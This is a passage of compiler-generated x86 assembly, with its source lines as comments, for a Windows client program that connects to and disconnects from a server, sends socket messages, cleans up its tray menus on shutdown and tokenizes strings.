	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [600] CPrint ($$main,"*** connecting to "+server$+":"+STRING$(port))
	mov	eax,addr @_string.01B3.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0147.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-48],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [601] IFT OpenSConnection (idx) THEN
	push	[ebp+8]			;;; i674a
	call	func31.client			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.002C.client			;;; i221
;
; [602] #CONNECTED = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%#CONNECTED.client],eax			;;; i668
;
; [603] buffer$ = "AUTH "+$$SR_AUTHPASS
#ifdef JoinServer.buffer$
#undef JoinServer.buffer$
#endif
#define JoinServer.buffer$ ebp-60	; exposes local variable 'buffer$'
;
	mov	eax,addr @_string.0134.client			;;; i663
	mov	ebx,addr @_string.2D2E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [604] SendSMessageBin (idx,&buffer$, SIZE(buffer$))
	mov	eax,d[ebp-60]			;;; i642
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.97			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.97:
	push	eax			;;; i667a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func34.client			;;; i619
;
; [605] _beginthreadex (NULL, 0, &sMessageListen(), idx, 0, &tid2)
#ifdef JoinServer.NULL
#undef JoinServer.NULL
#endif
#define JoinServer.NULL ebp-64	; exposes local variable 'NULL'
;
	mov	eax,addr _sMessageListen.client@4			;;; i599
	mov	d[ebp-48],eax			;;; i670
#ifdef JoinServer.tid2
#undef JoinServer.tid2
#endif
#define JoinServer.tid2 ebp-68	; exposes local variable 'tid2'
;
	lea	eax,[ebp-68]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [606] CPrint ($$main,"*** connected to "+server$+" on port "+STRING$(port))
	mov	eax,addr @_string.01B7.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.01B8.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-48],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [607] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3A.client			;;; i258
;
; [608] ELSE
	jmp	end.if.002C.client			;;; i107
else.002C.client:
;
; [609] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3A.client			;;; i258
;
; [610] END IF
end.if.002C.client:
;
; [612] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.JoinServer.client:  ;;; Function end label for Assembly Programmers.
end.func3A.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3A.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3A.client:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  JoinServer ()  *****
;  *****
;
; [614] FUNCTION DisconnectServer (idx)
.code
;
#ifdef DisconnectServer.idx
#undef DisconnectServer.idx
#endif
#define DisconnectServer.idx ebp+8	; exposes function argument 'idx'
;
align 16
_DisconnectServer.client@4:
;  *****
;  *****  FUNCTION  DisconnectServer ()  *****
;  *****
func3B.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3B.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody3B.client:
;
; [617] idx = 0
	mov	eax,0			;;; i659
	mov	d[ebp+8],eax			;;; i670
;
; [618] ProcessClientCmd (idx,"strevent","off")
	mov	eax,addr @_string.01BA.client			;;; i663
	call	%_clone.a0			;;; i634
; .xstk3B.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,addr @_string.01BB.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func39.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [619] IFT #stream THEN ProcessClientCmd (idx,"stroff","")
	mov	eax,d[%#stream.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.002D.client			;;; i221
	mov	eax,addr @_string.013B.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-44],eax			;;; i670
	push	0			;;; i665a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func39.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
else.002D.client:
end.if.002D.client:
;
; [621] Sleep (500)
	push	500			;;; i656a
	call	_Sleep@4			;;; i619
;
; [622] getSPServer (idx,@server$,port,"",0)
#ifdef DisconnectServer.server$
#undef DisconnectServer.server$
#endif
#define DisconnectServer.server$ ebp-48	; exposes local variable 'server$'
;
#ifdef DisconnectServer.port
#undef DisconnectServer.port
#endif
#define DisconnectServer.port ebp-52	; exposes local variable 'port'
;
	push	0			;;; i656a
	push	0			;;; i665a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func48.client			;;; i619
	mov	ecx,d[esp-16]			;;; i877a
	mov	[ebp-48],ecx			;;; i670
;
; [623] CPrint ($$main,"*** disconnecting from "+server$)
	mov	eax,addr @_string.01C0.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [624] CloseSConnection (idx)
	push	[ebp+8]			;;; i674a
	call	func32.client			;;; i619
;
; [625] CPrint ($$main,"*** "+server$+" disconnected")
	mov	eax,addr @_string.01C1.client			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.01C2.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [626] #CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#CONNECTED.client],eax			;;; i668
;
; [627] Sleep(100)
	push	100			;;; i656a
	call	_Sleep@4			;;; i619
;
; [629] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3B.client			;;; i258
;
; [630] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DisconnectServer.client:  ;;; Function end label for Assembly Programmers.
end.func3B.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3B.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func3B.client:
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DisconnectServer ()  *****
;  *****
;
; [632] FUNCTION Shutdown ()
.code
align 16
_Shutdown.client@0:
;  *****
;  *****  FUNCTION  Shutdown ()  *****
;  *****
func4.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody4.client:
;
; [633] SHARED APPLSTATUS
;
; [636] APPLSTATUS = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%APPLSTATUS.client],eax			;;; i668
;
; [637] IFT #CONNECTED THEN
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.002E.client			;;; i221
;
; [638] #CONNECTED = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#CONNECTED.client],eax			;;; i668
;
; [639] DisconnectServer (0)
	push	0			;;; i656a
	call	func3B.client			;;; i619
;
; [640] END IF
else.002E.client:
end.if.002E.client:
;
; [642] FSshutdown()
;
; [0] EXTERNAL FUNCTION FSshutdown()
	call	_FSshutdown@0			;;; i619
;
; [643] RemoveTrayIcon ()
	call	func1A.client			;;; i619
;
; [644] DestroyMenu (#hSysTrayMenu)
;
; [0] EXTERNAL FUNCTION DestroyMenu (hMenu)
data section 'globals$shared'
align	4
%#hSysTrayMenu.client:	db 4 dup ?
.code
	push	[%#hSysTrayMenu.client]			;;; i672a
	call	_DestroyMenu@4			;;; i619
;
; [645] DestroyMenu (#hMenuURL)
data section 'globals$shared'
align	4
%#hMenuURL.client:	db 4 dup ?
.code
	push	[%#hMenuURL.client]			;;; i672a
	call	_DestroyMenu@4			;;; i619
;
; [646] DestroyMenu (#hMenuFile)
data section 'globals$shared'
align	4
%#hMenuFile.client:	db 4 dup ?
.code
	push	[%#hMenuFile.client]			;;; i672a
	call	_DestroyMenu@4			;;; i619
;
; [647] DestroyMenu (#hMenuFolder)
data section 'globals$shared'
align	4
%#hMenuFolder.client:	db 4 dup ?
.code
	push	[%#hMenuFolder.client]			;;; i672a
	call	_DestroyMenu@4			;;; i619
;
; [648] DeleteObject (#hFontArial)
;
; [0] EXTERNAL FUNCTION  DeleteObject               (object)
data section 'globals$shared'
align	4
%#hFontArial.client:	db 4 dup ?
.code
	push	[%#hFontArial.client]			;;; i672a
	call	_DeleteObject@4			;;; i619
;
; [649] PostQuitMessage (0)
;
; [0] EXTERNAL FUNCTION PostQuitMessage (nExitCode)
	push	0			;;; i656a
	call	_PostQuitMessage@4			;;; i619
;
; [650] CleanUp ()
	call	func18.client			;;; i619
;
; [651] QUIT (0)
	sub	esp,64			;;; i487
	mov	d[esp],0
	call	%_quit
	add	esp,64			;;; i600
;
; [653] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.Shutdown.client:  ;;; Function end label for Assembly Programmers.
end.func4.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  Shutdown ()  *****
;  *****
;
; [655] FUNCTION SendSMessage (idx,STRING buffer)
.code
;
#ifdef SendSMessage.idx
#undef SendSMessage.idx
#endif
#define SendSMessage.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef SendSMessage.buffer
#undef SendSMessage.buffer
#endif
#define SendSMessage.buffer ebp+12	; exposes function argument 'buffer'
;
align 16
_SendSMessage.client@8:
;  *****
;  *****  FUNCTION  SendSMessage ()  *****
;  *****
func33.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody33.client:
;
; [657] buffer = buffer + "\r\n"
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.01CE.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [658] RETURN SendSMessageBin (idx, &buffer, SIZE(buffer))
	mov	eax,d[ebp+12]			;;; i642
; .xstk33.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.106			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.106:
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func34.client			;;; i619
	jmp	end.func33.client			;;; i258
;
; [659] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SendSMessage.client:  ;;; Function end label for Assembly Programmers.
end.func33.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SendSMessage ()  *****
;  *****
;
; [661] FUNCTION SendSMessageBin (idx,pbuffer,size)
.code
;
#ifdef SendSMessageBin.idx
#undef SendSMessageBin.idx
#endif
#define SendSMessageBin.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef SendSMessageBin.pbuffer
#undef SendSMessageBin.pbuffer
#endif
#define SendSMessageBin.pbuffer ebp+12	; exposes function argument 'pbuffer'
;
;
#ifdef SendSMessageBin.size
#undef SendSMessageBin.size
#endif
#define SendSMessageBin.size ebp+16	; exposes function argument 'size'
;
align 16
_SendSMessageBin.client@12:
;  *****
;  *****  FUNCTION  SendSMessageBin ()  *****
;  *****
func34.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.112:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.112			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody34.client:
;
; [662] SHARED TSPROFILE sprofile[]
data section 'globals$shared'
align	4
%%%sprofile.client:	db 4 dup ?
.code
;
; [665] IF WaitForSingleObject (#hsmSend,29000) == $$WAIT_TIMEOUT THEN RETURN $$FALSE
data section 'globals$shared'
align	4
%#hsmSend.client:	db 4 dup ?
.code
	push	29000			;;; i656a
	push	[%#hsmSend.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.002F.client			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func34.client			;;; i258
else.002F.client:
end.if.002F.client:
;
; [666] IF !pbuffer || !size THEN
	mov	eax,d[ebp+12]			;;; i665
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	mov	ebx,d[ebp+16]			;;; i665
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0030.client			;;; i221
;
; [667] ReleaseSemaphore (#hsmSend,1,NULL)
#ifdef SendSMessageBin.NULL
#undef SendSMessageBin.NULL
#endif
#define SendSMessageBin.NULL ebp-40	; exposes local variable 'NULL'
;
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmSend.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [668] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func34.client			;;; i258
;
; [669] END IF
else.0030.client:
end.if.0030.client:
;
; [670] socket = sprofile[idx].server.socket
#ifdef SendSMessageBin.socket
#undef SendSMessageBin.socket
#endif
#define SendSMessageBin.socket ebp-44	; exposes local variable 'socket'
;
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	eax,d[eax+72]			;;; i313b
	mov	d[ebp-44],eax			;;; i670
;
; [671] IFZ socket THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0031.client			;;; i195
;
; [672] CPrint ($$main,"* not connected")
	mov	eax,addr @_string.01D9.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [673] ReleaseSemaphore (#hsmSend,1,NULL)
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmSend.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [674] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func34.client			;;; i258
;
; [675] END IF
else.0031.client:
end.if.0031.client:
;
; [677] total = 0
#ifdef SendSMessageBin.total
#undef SendSMessageBin.total
#endif
#define SendSMessageBin.total ebp-48	; exposes local variable 'total'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [678] sent = 0
#ifdef SendSMessageBin.sent
#undef SendSMessageBin.sent
#endif
#define SendSMessageBin.sent ebp-52	; exposes local variable 'sent'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [679] tsize = size
#ifdef SendSMessageBin.tsize
#undef SendSMessageBin.tsize
#endif
#define SendSMessageBin.tsize ebp-56	; exposes local variable 'tsize'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-56],eax			;;; i670
;
; [680] DO
align 8
do.0032.client:
;
; [681] sent = send (socket, pbuffer+sent, size, 0)
;
; [0] EXTERNAL SFUNCTION  send             (socket, addrMessage, length, flags)
	mov	eax,d[ebp+12]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i775
; .xstk34.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+16]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-44]			;;; i674a
	call	_send@16			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [682] IF (sent == $$SOCKET_ERROR) THEN
	mov	eax,d[ebp-52]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.0033.client			;;; i219
;
; [683] CPrint ($$main,"* send error: "+WSAErrorToName(WSAGetLastError()))
;
; [0] EXTERNAL SFUNCTION  WSAGetLastError  ()
	call	_WSAGetLastError@0			;;; i619
	push	eax			;;; i667a
	call	func44.client			;;; i619
	mov	ebx,addr @_string.01DE.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [684] ReleaseSemaphore (#hsmSend,1,0)
	push	0			;;; i656a
	push	1			;;; i656a
	push	[%#hsmSend.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [685] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func34.client			;;; i258
;
; [686] ELSE
	jmp	end.if.0033.client			;;; i107
else.0033.client:
;
; [687] total = total + sent
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-48],eax			;;; i670
;
; [688] size = size - sent
	mov	eax,d[ebp+16]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp+16],eax			;;; i670
;
; [689] END IF
end.if.0033.client:
;
; [690] LOOP WHILE (total < tsize)
do.loop.0032.client:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i684a
	jl	< do.0032.client			;;; i193
end.do.0032.client:
;
; [692] ReleaseSemaphore (#hsmSend,1,NULL)
	push	[ebp-40]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmSend.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [693] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func34.client			;;; i258
;
; [694] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.SendSMessageBin.client:  ;;; Function end label for Assembly Programmers.
end.func34.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  SendSMessageBin ()  *****
;  *****
;
; [696] FUNCTION GetToken (str$,msg$,term)
.code
;
#ifdef GetToken.str$
#undef GetToken.str$
#endif
#define GetToken.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef GetToken.msg$
#undef GetToken.msg$
#endif
#define GetToken.msg$ ebp+12	; exposes function argument 'msg$'
;
;
#ifdef GetToken.term
#undef GetToken.term
#endif
#define GetToken.term ebp+16	; exposes function argument 'term'
;
align 16
_GetToken.client@12:
;  *****
;  *****  FUNCTION  GetToken ()  *****
;  *****
func35.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody35.client:
;
; [699] IFZ str$ THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.113			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0034.client			;;; i192
A.113:
	mov	eax,0			;;; i659
	jmp	end.func35.client			;;; i258
else.0034.client:
end.if.0034.client:
;
; [700] len = LEN(str$)
#ifdef GetToken.len
#undef GetToken.len
#endif
#define GetToken.len ebp-40	; exposes local variable 'len'
;
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.114			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.114:
	mov	d[ebp-40],eax			;;; i670
;
; [701] msg$=""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [703] FOR p = 0 TO len-1
#ifdef GetToken.p
#undef GetToken.p
#endif
#define GetToken.p ebp-44	; exposes local variable 'p'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
; .forlimit35.0035 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
align 8
for.0035.client:
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.0035.client			;;; i154
;
; [704] IF str${p} = term THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+16]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.0036.client			;;; i219
;
; [705] INC p
	inc	d[ebp-44]			;;; i84
;
; [706] str$ = RIGHT$(str$,len-p)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [707] RETURN p
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func35.client			;;; i258
;
; [708] ELSE
	jmp	end.if.0036.client			;;; i107
else.0036.client:
;
; [709] msg$ = msg$ + CHR$(str${p})
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp+12]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [710] END IF
end.if.0036.client:
;
; [711] NEXT p
do.next.0035.client:
	inc	d[ebp-44]			;;; i229
